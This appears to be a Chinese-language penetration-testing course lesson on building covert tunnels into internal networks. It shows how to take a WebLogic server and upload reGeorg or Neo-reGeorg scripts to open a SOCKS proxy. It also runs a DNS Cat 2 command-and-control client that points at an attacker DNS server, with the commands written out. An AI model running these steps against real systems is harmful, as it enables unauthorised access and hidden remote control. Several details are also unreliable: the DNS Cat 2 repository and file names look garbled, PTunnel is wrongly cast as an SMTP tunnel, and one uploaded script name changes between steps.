# 网络安全实战教程 P66：第35天 - HTTP/DNS/SMTP代理隧道搭建 🛠️

在本节课中，我们将学习三种不同类型的网络代理隧道技术：HTTP隧道、DNS隧道和SMTP隧道。我们将通过具体的工具（reGeorg、DNS Cat 2、PTunnel）来理解其原理和实战应用，帮助你在内网渗透测试中建立稳定的代理通道。

---

![](img/a13c3663f63c12f5c250b9e0148eed8a_1.png)

![](img/a13c3663f63c12f5c250b9e0148eed8a_3.png)

## 第一部分：HTTP代理隧道与reGeorg的使用 🌐

上一节我们概述了课程内容，本节中我们来看看如何使用reGeorg工具建立HTTP隧道。

reGeorg是reDuh的升级版，其核心功能是将内网服务的端口数据，通过HTTP/HTTPS隧道转发到攻击者的本机，从而实现基于HTTP协议的通信。我们可以通过它在本机开启一个SOCKS代理，将流量通过HTTP隧道代理到目标内网。

以下是reGeorg工具的主要参数说明：
*   `-l`：指定本地监听的IP地址。
*   `-p`：指定本地监听的端口。
*   `-u`：指定包含隧道脚本的URL地址。

![](img/a13c3663f63c12f5c250b9e0148eed8a_5.png)

![](img/a13c3663f63c12f5c250b9e0148eed8a_7.png)

![](img/a13c3663f63c12f5c250b9e0148eed8a_9.png)

该工具的服务端是一个上传到目标Web服务器的脚本文件。我们通过Python脚本`reGeorgSocksProxy.py`来创建本地的SOCKS代理通道。它提供了多种脚本（如JSP、PHP、ASPX等），以适应不同的服务器环境。

![](img/a13c3663f63c12f5c250b9e0148eed8a_11.png)

![](img/a13c3663f63c12f5c250b9e0148eed8a_13.png)

![](img/a13c3663f63c12f5c250b9e0148eed8a_15.png)

### 实战演示：利用WebLogic漏洞建立隧道

![](img/a13c3663f63c12f5c250b9e0148eed8a_17.png)

我们以一个存在漏洞的WebLogic服务器（IP: 192.168.78.105，端口:7001）为例。

![](img/a13c3663f63c12f5c250b9e0148eed8a_19.png)

![](img/a13c3663f63c12f5c250b9e0148eed8a_21.png)

1.  **信息收集与漏洞利用**：通过扫描发现WebLogic服务，并利用历史漏洞（如CVE-2019-2725）获取WebShell。使用专用脚本可以执行命令并写入WebShell文件。
2.  **上传隧道脚本**：将reGeorg的隧道脚本（例如`tunnel.jsp`）上传到目标服务器的Web目录下。
3.  **启动本地代理**：在攻击机上执行Python客户端脚本，指向已上传的隧道脚本URL。
    ```bash
    python reGeorgSocksProxy.py -p 1080 -u http://192.168.78.105:7001/bea_wls_internal/tunnel.jsp
    ```
4.  **验证代理通道**：成功启动后，本机会监听1080端口的SOCKS5代理。配置浏览器或工具使用该代理（127.0.0.1:1080），即可访问目标内网的其他地址（如`10.10.10.8`）。

![](img/a13c3663f63c12f5c250b9e0148eed8a_23.png)

---

![](img/a13c3663f63c12f5c250b9e0148eed8a_25.png)

![](img/a13c3663f63c12f5c250b9e0148eed8a_27.png)

## 第二部分：增强版HTTP隧道 - Neo-reGeorg 🚀

![](img/a13c3663f63c12f5c250b9e0148eed8a_29.png)

![](img/a13c3663f63c12f5c250b9e0148eed8a_31.png)

上一节我们介绍了基础的reGeorg，本节中我们来看看它的增强重构版——Neo-reGeorg。

Neo-reGeorg在安全性、稳定性和可用性上做了大量改进。其根本原理未变，但增加了连接密码验证，使隧道更安全。

![](img/a13c3663f63c12f5c250b9e0148eed8a_33.png)

![](img/a13c3663f63c12f5c250b9e0148eed8a_35.png)

### 使用步骤

![](img/a13c3663f63c12f5c250b9e0148eed8a_37.png)

![](img/a13c3663f63c12f5c250b9e0148eed8a_39.png)

![](img/a13c3663f63c12f5c250b9e0148eed8a_41.png)

以下是Neo-reGeorg的基本使用流程：

![](img/a13c3663f63c12f5c250b9e0148eed8a_43.png)

![](img/a13c3663f63c12f5c250b9e0148eed8a_45.png)

![](img/a13c3663f63c12f5c250b9e0148eed8a_47.png)

![](img/a13c3663f63c12f5c250b9e0148eed8a_49.png)

![](img/a13c3663f63c12f5c250b9e0148eed8a_51.png)

1.  **生成隧道脚本**：使用工具自带的生成功能，创建一个带密码的隧道脚本。
    ```bash
    python neoreg.py generate -k mypassword
    ```
    执行后会在当前目录生成`neoreg_servers/`文件夹，里面包含各种语言的隧道脚本和一个记录密钥的`key.txt`文件。
2.  **上传脚本**：将生成的脚本（如`tunnel.jsp`）上传到目标Web服务器。
3.  **连接隧道**：在攻击机上运行客户端，指定脚本URL、密码和本地代理端口。
    ```bash
    python3 neoreg.py -u http://192.168.78.105:7001/password.jsp -k mypassword -p 1080
    ```
4.  **使用代理**：与reGeorg一样，配置代理为`127.0.0.1:1080`即可通过隧道访问内网资源。

![](img/a13c3663f63c12f5c250b9e0148eed8a_53.png)

![](img/a13c3663f63c12f5c250b9e0148eed8a_55.png)

![](img/a13c3663f63c12f5c250b9e0148eed8a_57.png)

---

![](img/a13c3663f63c12f5c250b9e0148eed8a_59.png)

![](img/a13c3663f63c12f5c250b9e0148eed8a_61.png)

## 第三部分：DNS隧道与DNS Cat 2 📡

上一节我们完成了HTTP隧道的搭建，本节中我们来看看另一种隐蔽的隧道技术——DNS隧道。

![](img/a13c3663f63c12f5c250b9e0148eed8a_63.png)

DNS Cat 2是一个DNS隧道工具，它通过DNS协议创建加密的命令与控制（C&C）通道。其特色是服务端提供了一个交互式控制台，可以直接对目标机器进行命令控制。

![](img/a13c3663f63c12f5c250b9e0148eed8a_65.png)

![](img/a13c3663f63c12f5c250b9e0148eed8a_67.png)

### DNS解析类型简述

![](img/a13c3663f63c12f5c250b9e0148eed8a_69.png)

![](img/a13c3663f63c12f5c250b9e0148eed8a_71.png)

在深入之前，需要了解两个关键的DNS记录类型：
*   **A记录**：将域名指向一个IPv4地址。
*   **NS记录**：指定该域名由哪个DNS服务器进行解析。

### DNS Cat 2的两种模式

![](img/a13c3663f63c12f5c250b9e0148eed8a_73.png)

![](img/a13c3663f63c12f5c250b9e0148eed8a_75.png)

DNS Cat 2支持两种工作模式：
1.  **直连模式**：客户端直接向指定的DNS服务器IP发起解析请求。速度快，但特征较明显。
2.  **中继模式**：客户端像正常上网一样，通过递归查询的方式，最终将请求指向我们控制的DNS服务器。速度慢，但隐蔽性更好，因为流量混合在正常的DNS查询中。

![](img/a13c3663f63c12f5c250b9e0148eed8a_77.png)

![](img/a13c3663f63c12f5c250b9e0148eed8a_79.png)

![](img/a13c3663f63c12f5c250b9e0148eed8a_81.png)

### 环境搭建与使用

![](img/a13c3663f63c12f5c250b9e0148eed8a_83.png)

![](img/a13c3663f63c12f5c250b9e0148eed8a_85.png)

![](img/a13c3663f63c12f5c250b9e0148eed8a_87.png)

以下是搭建DNS Cat 2服务的基本步骤：

![](img/a13c3663f63c12f5c250b9e0148eed8a_89.png)

1.  **安装依赖**：在作为服务端的VPS上安装Ruby环境及相关依赖（如`ruby-dev`、`make`、`git`、`bind9`）。
2.  **克隆并安装**：
    ```bash
    git clone https://github.com/shellster/DNS-Cat2.git
    cd DNS-Cat2/server
    sudo ./bundle-install.sh
    ```
3.  **编译客户端**：在`client/`目录下执行`make`，生成可执行的客户端程序`dns-cat`。
4.  **启动服务端**：
    ```bash
    ruby dns-cat2.rb
    ```
5.  **客户端连接**：在目标机器上运行客户端程序，指向服务端域名或IP。
    ```bash
    ./dns-cat --host your-dns-server.com
    ```
6.  **进行控制**：连接成功后，在服务端控制台即可对目标机器执行命令。

---

## 第四部分：SMTP隧道与PTunnel简介 📧

最后，我们简要了解基于SMTP协议的隧道工具PTunnel。

PTunnel (Ping Tunnel) 虽然名称是Ping，但它可以利用ICMP、TCP、UDP等多种协议建立隧道。其中一种应用就是通过SMTP服务器的25端口来转发流量，这在某些只开放邮件端口的严格网络环境中可能有效。

其核心思想是将待转发的数据封装在SMTP协议的数据包中，通过邮件服务器进行传输，从而绕过防火墙的限制。

---

![](img/a13c3663f63c12f5c250b9e0148eed8a_91.png)

## 总结与回顾 🎯

本节课中我们一起学习了三种内网代理隧道技术：
1.  **HTTP隧道**：通过reGeorg和Neo-reGeorg工具，利用Web服务器的HTTP/HTTPS端口建立稳定的SOCKS5代理，是内网穿透的常用手段。
2.  **DNS隧道**：通过DNS Cat 2工具，利用DNS查询请求和响应建立隐蔽的命令控制通道，适合在严格过滤TCP/UDP流量的环境中使用。
3.  **SMTP隧道**：通过PTunnel等工具，利用邮件服务器的SMTP协议进行数据封装转发，是一种特殊的隧道利用方式。

![](img/a13c3663f63c12f5c250b9e0148eed8a_93.png)

掌握这些隧道技术，能够帮助你在不同的网络限制条件下，灵活地建立与内网的通信连接，是渗透测试人员必备的技能。